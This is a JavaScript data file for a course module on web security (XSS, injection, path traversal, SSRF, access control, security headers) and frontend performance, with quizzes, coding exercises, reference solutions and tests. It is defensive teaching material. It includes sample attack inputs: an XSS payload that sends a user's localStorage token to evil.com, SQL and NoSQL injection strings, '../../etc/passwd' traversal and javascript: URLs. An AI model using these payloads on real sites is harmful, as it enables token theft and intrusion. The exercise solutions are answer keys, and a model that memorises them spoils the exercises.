LIB_ADD({
  id: "web-sec", title: "Web security and performance engineering", group: "Web degree depth", order: 8, glyph: "SEC",
  blurb: "XSS and CSP, injection, path traversal and SSRF, CSRF and broken access control, security headers, then bundle, image and rendering performance — with problems for escaping, URL sanitising, safe paths, authorisation checks and list virtualisation.",
  intro: "Security and performance are what separate a demo from a product. This subject covers the OWASP risks that actually hit full-stack apps and the performance techniques that keep them fast on a budget Android phone.",
  modules: [
    { title: "1. Security", lessons: [
      { id: "wsc-xss", t: "XSS, output encoding and Content Security Policy", mins: 35,
        body: [
          "<b>Cross-site scripting (XSS)</b>: attacker-controlled data is interpreted as code in your page. <b>Stored</b> (saved in your DB, e.g. a review), <b>reflected</b> (echoed from the URL), <b>DOM-based</b> (your own JS writes untrusted data into a dangerous sink). Impact: stealing tokens from localStorage, acting as the user, defacing pages.",
          "Defence #1 is <b>contextual output encoding</b>: HTML text needs &amp; &lt; &gt; \" ' escaped; attributes must be quoted and escaped; URLs must be checked for safe schemes (<code>javascript:</code> URLs execute code); never build JavaScript or CSS from user input. React escapes text automatically — the holes are <code>dangerouslySetInnerHTML</code>, <code>href</code> with user URLs, and <code>innerHTML</code> in vanilla JS.",
          "If you must render user HTML (rich text, Markdown), sanitise it with an allow-list library like DOMPurify.",
          "<b>Content Security Policy</b> is defence in depth: <code>Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-…'; object-src 'none'; base-uri 'none'</code> blocks inline scripts and unknown origins even if an injection slips through. Start with Report-Only mode.",
          "HttpOnly cookies limit what XSS can steal, but XSS can still make requests as the user — prevention matters most.",
        ],
        keys: ["Encode output for its context.", "Block javascript: URLs.", "Sanitise user HTML with an allow-list.", "CSP is a second line of defence."],
        ex: "A product review containing &lt;img src=x onerror=fetch('//evil.com?c='+localStorage.token)&gt;, rendered with innerHTML, sends every viewer's token to the attacker.",
        fact: "XSS has appeared in every edition of the OWASP Top 10; since 2021 it's grouped under 'Injection'.",
        quiz: [
          { q: "In React, which is a real XSS risk?", o: ["{user.name} in JSX", "&lt;a href={userUrl}&gt; with a javascript: URL", "useState", "className"], a: 1, why: "React escapes text but doesn't block dangerous URL schemes in all cases." },
          { q: "CSP's main job is to…", o: ["Speed up pages", "Limit which scripts and resources can load and run", "Encrypt cookies", "Validate forms"], a: 1, why: "It reduces the impact of injection." },
        ],
        code: [
          { id: "sc-escape", t: "Escape HTML", diff: "Easy", fn: "escapeHtml",
            statement: "<p>Write <code>escapeHtml(s)</code> replacing <code>&amp; &lt; &gt; \" '</code> with <code>&amp;amp; &amp;lt; &amp;gt; &amp;quot; &amp;#39;</code>. Non-strings should be converted with <code>String()</code> first. (Order matters — think about why.)</p>",
            examples: [{ in: "escapeHtml('<b>\"Hi\" & bye</b>')", out: "'&lt;b&gt;&quot;Hi&quot; &amp; bye&lt;/b&gt;'" }],
            hints: ["Escape & first, otherwise you'd double-escape the & in &lt;.", "Or use one regex with a lookup map."],
            starter: `function escapeHtml(s) {
  // your code here
}`,
            solution: `function escapeHtml(s) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
  return String(s).replace(/[&<>"']/g, (c) => map[c]);
}`,
            tests: [
              { args: ["<b>\"Hi\" & bye</b>"], expect: "&lt;b&gt;&quot;Hi&quot; &amp; bye&lt;/b&gt;" }, { args: ["it's"], expect: "it&#39;s" },
              { args: ["&lt;"], expect: "&amp;lt;" }, { args: [42], expect: "42" }, { args: ["plain"], expect: "plain" },
            ] },
          { id: "sc-url", t: "Sanitise user-provided links", diff: "Medium", fn: "safeUrl",
            statement: "<p>Write <code>safeUrl(input)</code> for user-submitted links (profile website, chat links). Trim it and remove ASCII control characters and whitespace inside the scheme area (attackers write <code>'java\\tscript:'</code> or <code>' JavaScript:'</code>). Allow relative URLs (starting with <code>/</code>, <code>./</code>, <code>../</code>, <code>#</code> or <code>?</code>) and absolute URLs with schemes <code>http</code>, <code>https</code> or <code>mailto</code> (case-insensitive). Return the cleaned URL if allowed, otherwise <code>'about:blank'</code>.</p>",
            examples: [{ in: "safeUrl(' JavaScript:alert(1)')", out: "'about:blank'" }, { in: "safeUrl('https://pankqx.github.io')", out: "'https://pankqx.github.io'" }],
            hints: ["Remove characters with codes 0–32 (and 127) everywhere before checking: s.replace(/[\\u0000-\\u0020\\u007f]/g, '').", "A scheme is letters/digits/+.- before the first ':' — if there's a ':' before any '/', '?' or '#', it's absolute.", "Anything else without a scheme (like 'example.com/page') is treated as relative and allowed."],
            starter: `function safeUrl(input) {
  // your code here
}`,
            solution: `function safeUrl(input) {
  const s = String(input).replace(/[\\u0000-\\u0020\\u007f]/g, '');
  const m = s.match(/^([a-zA-Z][a-zA-Z0-9+.-]*):/);
  if (!m) return s;
  return ['http', 'https', 'mailto'].includes(m[1].toLowerCase()) ? s : 'about:blank';
}`,
            explain: "Browsers ignore some whitespace and control characters inside schemes, so you must normalise exactly as aggressively before deciding. Allow-lists beat block-lists: new dangerous schemes (data:, vbscript:) are rejected automatically.",
            tests: [
              { args: [" JavaScript:alert(1)"], expect: "about:blank" }, { args: ["java\tscript:alert(1)"], expect: "about:blank" }, { args: ["https://pankqx.github.io"], expect: "https://pankqx.github.io" },
              { args: ["/profile/7"], expect: "/profile/7" }, { args: ["MAILTO:me@x.com"], expect: "MAILTO:me@x.com" }, { args: ["data:text/html;base64,PHNjcmlwdD4="], expect: "about:blank" },
              { args: ["#top"], expect: "#top" },
            ] },
        ] },
      { id: "wsc-inject", t: "Injection, path traversal and SSRF", mins: 35,
        body: [
          "<b>SQL injection</b>: building queries with string concatenation lets input change the query: <code>' OR '1'='1</code>. Always use <b>parameterised queries</b> (<code>WHERE email = $1</code>) — ORMs do this by default, but raw query helpers and dynamic ORDER BY columns need care (allow-list column names).",
          "<b>NoSQL injection</b>: passing a JSON body straight into a MongoDB filter lets attackers send <code>{\"password\": {\"$ne\": null}}</code>. Validate types (string, not object) before querying.",
          "<b>Command injection</b>: never pass user input to a shell; use execFile with argument arrays.",
          "<b>Path traversal</b>: a download route that joins <code>uploads/</code> with <code>../../etc/passwd</code> serves any file. Resolve the final path and verify it's still inside the base directory.",
          "<b>SSRF</b> (server-side request forgery): features that fetch a user-supplied URL (link previews, webhooks, image import) can be pointed at internal services or cloud metadata (169.254.169.254). Allow-list hosts, block private IP ranges after DNS resolution, and disable redirects or re-check them.",
        ],
        keys: ["Parameterised queries, always.", "Validate types before NoSQL filters.", "Resolve paths and check they stay inside the base.", "SSRF: allow-list and block private IPs."],
        ex: "Capital One's 2019 breach involved SSRF against a cloud metadata endpoint, exposing data of around 100 million people.",
        fact: "Injection has been in the OWASP Top 10 since its first edition in 2003.",
        quiz: [
          { q: "The fix for SQL injection is…", o: ["Escaping quotes by hand", "Parameterised queries", "Hiding errors", "Using POST"], a: 1, why: "Data is sent separately from the query text." },
          { q: "A link-preview feature fetches http://169.254.169.254/… This is…", o: ["XSS", "SSRF", "CSRF", "Clickjacking"], a: 1, why: "The server is tricked into requesting an internal address." },
        ],
        code: [
          { id: "sc-path", t: "Safe path join (stop path traversal)", diff: "Medium", fn: "safeJoin",
            statement: "<p>Write <code>safeJoin(base, userPath)</code> for POSIX-style paths. Normalise <code>base + '/' + userPath</code>: collapse repeated slashes, drop '.' segments, resolve '..' segments. If <code>userPath</code> is absolute (starts with '/'), treat it as relative to base anyway. Return the normalised absolute path if it is base itself or inside base; otherwise return <code>null</code>. <code>base</code> is an absolute normalised path like <code>'/srv/uploads'</code>.</p>",
            examples: [{ in: "safeJoin('/srv/uploads', 'a/../b.png')", out: "'/srv/uploads/b.png'" }, { in: "safeJoin('/srv/uploads', '../../etc/passwd')", out: "null" }],
            hints: ["Split on '/', and use a stack: push names, pop on '..', skip '' and '.'.", "Check the result starts with base + '/' (or equals base) — '/srv/uploads-old' must not count as inside '/srv/uploads'."],
            starter: `function safeJoin(base, userPath) {
  // your code here
}`,
            solution: `function safeJoin(base, userPath) {
  const stack = [];
  for (const seg of (base + '/' + userPath).split('/')) {
    if (seg === '' || seg === '.') continue;
    if (seg === '..') { if (stack.length) stack.pop(); }
    else stack.push(seg);
  }
  const full = '/' + stack.join('/');
  return full === base || full.startsWith(base + '/') ? full : null;
}`,
            explain: "Normalise first, check second. Checking the raw string for '..' misses encoded and nested variants; checking the resolved path doesn't.",
            tests: [
              { args: ["/srv/uploads", "a/../b.png"], expect: "/srv/uploads/b.png" }, { args: ["/srv/uploads", "../../etc/passwd"], expect: null },
              { args: ["/srv/uploads", "/etc/passwd"], expect: "/srv/uploads/etc/passwd" }, { args: ["/srv/uploads", "../uploads-old/x"], expect: null },
              { args: ["/srv/uploads", "./x//y/./z"], expect: "/srv/uploads/x/y/z" }, { args: ["/srv/uploads", "a/../.."], expect: null }, { args: ["/srv/uploads", ""], expect: "/srv/uploads" },
            ] },
        ] },
      { id: "wsc-access", t: "CSRF, broken access control and security headers", mins: 35,
        body: [
          "<b>Broken access control</b> is OWASP's #1 risk (2021): users acting outside their permissions. <b>IDOR</b> — changing /orders/41 to /orders/42 and seeing someone else's order — happens when you check 'logged in' but not 'owns this resource'. Check authorisation on <b>every</b> request, on the server, for the specific resource.",
          "Models: <b>RBAC</b> (roles → permissions), ownership rules (users can edit their own posts), <b>ABAC</b> (attributes: department, time, plan). Deny by default; centralise the checks in one policy module.",
          "<b>CSRF</b>: if auth relies on cookies, another site can make the browser send a request with them (a hidden auto-submitting form). Defences: SameSite=Lax/Strict cookies, CSRF tokens for state-changing requests, checking the Origin header, never changing state with GET.",
          "<b>Security headers</b>: <code>Strict-Transport-Security</code> (HTTPS only), <code>Content-Security-Policy</code>, <code>X-Content-Type-Options: nosniff</code>, <code>Referrer-Policy</code>, <code>frame-ancestors</code> in CSP (or X-Frame-Options) against clickjacking, <code>Permissions-Policy</code>. Helmet sets sensible defaults in Express.",
          "<b>Secrets and supply chain</b>: secrets in env vars or a secret manager, never in git or frontend bundles; run npm audit/Dependabot; pin versions with lockfiles; minimal permissions for CI tokens.",
        ],
        keys: ["Authorise every request for the specific resource.", "Deny by default; central policy.", "CSRF: SameSite + tokens + no state change on GET.", "HSTS, CSP, nosniff, frame-ancestors."],
        ex: "An admin panel that hides the Delete button for normal users but doesn't check the role on DELETE /users/:id is broken access control — anyone with curl can delete users.",
        fact: "Broken access control moved to the #1 spot in the OWASP Top 10 in 2021; 94% of tested applications had some form of it.",
        quiz: [
          { q: "Hiding a button in the UI is…", o: ["Enough authorisation", "Not authorisation — the server must check", "CSRF protection", "RBAC"], a: 1, why: "Attackers call your API directly." },
          { q: "Which header forces browsers to use HTTPS?", o: ["CSP", "Strict-Transport-Security", "nosniff", "Referrer-Policy"], a: 1, why: "HSTS." },
        ],
        code: [
          { id: "sc-authz", t: "An authorisation policy", diff: "Medium", fn: "can",
            statement: "<p>Write <code>can(user, action, resource)</code>. Rules: users with role <code>'admin'</code> can do anything; <code>'read'</code> is allowed if the resource is public, or the user owns it (<code>resource.ownerId === user.id</code>), or the user is in <code>resource.sharedWith</code>; <code>'update'</code> is allowed for the owner or users listed in <code>resource.editors</code>; <code>'delete'</code> only for the owner. A missing user (null) can only read public resources. Everything else is denied.</p>",
            examples: [{ in: "can({id: 2, role: 'user'}, 'delete', {ownerId: 1})", out: "false" }],
            hints: ["Handle admin first, then switch on action.", "Default to false at the end (deny by default).", "Treat missing arrays as empty."],
            starter: `function can(user, action, resource) {
  // your code here
}`,
            solution: `function can(user, action, resource) {
  if (user && user.role === 'admin') return true;
  const isOwner = !!user && resource.ownerId === user.id;
  const inList = (list) => !!user && (list || []).includes(user.id);
  switch (action) {
    case 'read': return !!resource.public || isOwner || inList(resource.sharedWith);
    case 'update': return isOwner || inList(resource.editors);
    case 'delete': return isOwner;
    default: return false;
  }
}`,
            tests: [
              { args: [{ id: 2, role: "user" }, "delete", { ownerId: 1 }], expect: false }, { args: [{ id: 1, role: "user" }, "delete", { ownerId: 1 }], expect: true },
              { args: [null, "read", { ownerId: 1, public: true }], expect: true }, { args: [null, "update", { ownerId: 1, public: true }], expect: false },
              { args: [{ id: 3, role: "user" }, "read", { ownerId: 1, sharedWith: [3] }], expect: true }, { args: [{ id: 3, role: "user" }, "update", { ownerId: 1, sharedWith: [3] }], expect: false },
              { args: [{ id: 4, role: "user" }, "update", { ownerId: 1, editors: [4] }], expect: true }, { args: [{ id: 9, role: "admin" }, "delete", { ownerId: 1 }], expect: true },
              { args: [{ id: 1, role: "user" }, "publish", { ownerId: 1 }], expect: false },
            ] },
        ] },
    ] },
    { title: "2. Performance engineering", lessons: [
      { id: "wsc-perf", t: "Frontend performance: bundles, images, rendering and virtualisation", mins: 40,
        body: [
          "Most Indian users browse on mid-range Android phones over mobile networks — test with CPU throttling and 'Fast 4G' in DevTools, not your laptop on Wi-Fi.",
          "<b>JavaScript cost</b> is download + parse + execute. Reduce it: <b>code splitting</b> (dynamic <code>import()</code>, route-based chunks), <b>tree shaking</b> (ES modules, side-effect-free packages), replace heavy libraries (moment → date-fns/Intl), and server components that ship no JS. Set a <b>performance budget</b> (e.g. &lt; 170 KB compressed JS for the initial route) and enforce it in CI.",
          "<b>Images</b> are usually the biggest bytes: modern formats (AVIF/WebP), responsive srcset/sizes, explicit dimensions (no layout shift), <code>loading=\"lazy\"</code> below the fold, <code>fetchpriority=\"high\"</code> for the LCP image.",
          "<b>Network</b>: HTTP/2 or HTTP/3, a CDN, compression (Brotli), long-lived caching for fingerprinted assets, <code>preconnect</code> to critical origins, and fewer round trips (avoid request waterfalls by fetching in parallel or on the server).",
          "<b>Rendering</b>: long lists are expensive — <b>virtualisation</b> renders only the rows in (and slightly around) the viewport. With fixed row height h, scroll offset s, viewport height H and overscan o: first index = max(0, ⌊s/h⌋ − o), last = min(n − 1, ⌈(s + H)/h⌉ − 1 + o). The list's total height stays n × h so the scrollbar is correct.",
          "<b>Profile, don't guess</b>: Lighthouse and WebPageTest for loading, the Performance panel for long tasks, the React Profiler for wasted renders, and real-user monitoring (web-vitals library) for what users actually experience.",
        ],
        keys: ["Test on throttled mobile.", "Split and shrink JavaScript; enforce a budget.", "Images: AVIF/WebP, srcset, dimensions, lazy below the fold.", "Virtualise long lists."],
        ex: "Rendering 10,000 chat messages as DOM nodes freezes a phone; a virtualised list renders about 20 at a time and scrolls smoothly.",
        fact: "Google's research found that as mobile page load time goes from 1 s to 3 s, the probability of a visitor bouncing increases by 32%.",
        quiz: [
          { q: "Which reduces initial JavaScript the most for a multi-page app?", o: ["Minifying only", "Route-based code splitting", "More polyfills", "Inline scripts"], a: 1, why: "Each route loads only what it needs." },
          { q: "List virtualisation means…", o: ["Using a VM", "Rendering only visible rows", "Server rendering", "Caching JSON"], a: 1, why: "DOM size stays small regardless of list length." },
        ],
        code: [
          { id: "sc-virtual", t: "Virtual list window", diff: "Medium", fn: "visibleRange",
            statement: "<p>Write <code>visibleRange({scrollTop, viewportHeight, rowHeight, count, overscan})</code> returning <code>{start, end, offsetY, totalHeight}</code>: the first and last row indexes to render (inclusive, clamped to the list, using the formulas in the lesson), <code>offsetY = start × rowHeight</code> (where to position the first rendered row) and <code>totalHeight = count × rowHeight</code>. For an empty list return start 0, end −1.</p>",
            examples: [{ in: "visibleRange({scrollTop: 450, viewportHeight: 300, rowHeight: 50, count: 1000, overscan: 2})", out: "{start: 7, end: 16, offsetY: 350, totalHeight: 50000}" }],
            hints: ["start = max(0, floor(scrollTop / rowHeight) − overscan).", "end = min(count − 1, ceil((scrollTop + viewportHeight) / rowHeight) − 1 + overscan)."],
            starter: `function visibleRange({ scrollTop, viewportHeight, rowHeight, count, overscan = 0 }) {
  // your code here
}`,
            solution: `function visibleRange({ scrollTop, viewportHeight, rowHeight, count, overscan = 0 }) {
  if (count === 0) return { start: 0, end: -1, offsetY: 0, totalHeight: 0 };
  const start = Math.max(0, Math.floor(scrollTop / rowHeight) - overscan);
  const end = Math.min(count - 1, Math.ceil((scrollTop + viewportHeight) / rowHeight) - 1 + overscan);
  return { start, end, offsetY: start * rowHeight, totalHeight: count * rowHeight };
}`,
            tests: [
              { args: [{ scrollTop: 450, viewportHeight: 300, rowHeight: 50, count: 1000, overscan: 2 }], expect: { start: 7, end: 16, offsetY: 350, totalHeight: 50000 } },
              { args: [{ scrollTop: 0, viewportHeight: 200, rowHeight: 40, count: 3, overscan: 3 }], expect: { start: 0, end: 2, offsetY: 0, totalHeight: 120 } },
              { args: [{ scrollTop: 9800, viewportHeight: 200, rowHeight: 20, count: 500, overscan: 0 }], expect: { start: 490, end: 499, offsetY: 9800, totalHeight: 10000 } },
              { args: [{ scrollTop: 0, viewportHeight: 100, rowHeight: 10, count: 0 }], expect: { start: 0, end: -1, offsetY: 0, totalHeight: 0 } },
            ] },
        ],
        project: { t: "Lab: security and performance audit of your capstone", brief: "Treat Bazaar as a real product: attack it, then make it fast.", steps: ["Run through the OWASP Top 10 as a checklist; try IDOR (change ids in URLs), XSS (script in reviews and profile links), CSRF and path traversal on uploads; fix each finding and add a regression test.", "Add Helmet with a strict CSP (nonce-based), HSTS and frame-ancestors; verify with securityheaders.com.", "Run npm audit and enable Dependabot; move all secrets to environment variables.", "Measure on throttled mobile: Lighthouse, bundle analyser; code-split routes, optimise images, virtualise the product list — record before/after LCP, INP and JS size.", "Write a one-page 'security and performance report' for your README — interviewers love this."], stretch: ["Add rate limiting and bot protection to login and checkout", "Set up real-user monitoring with the web-vitals library", "A Lighthouse CI check that fails the build on regressions"] } },
    ] },
  ],
});
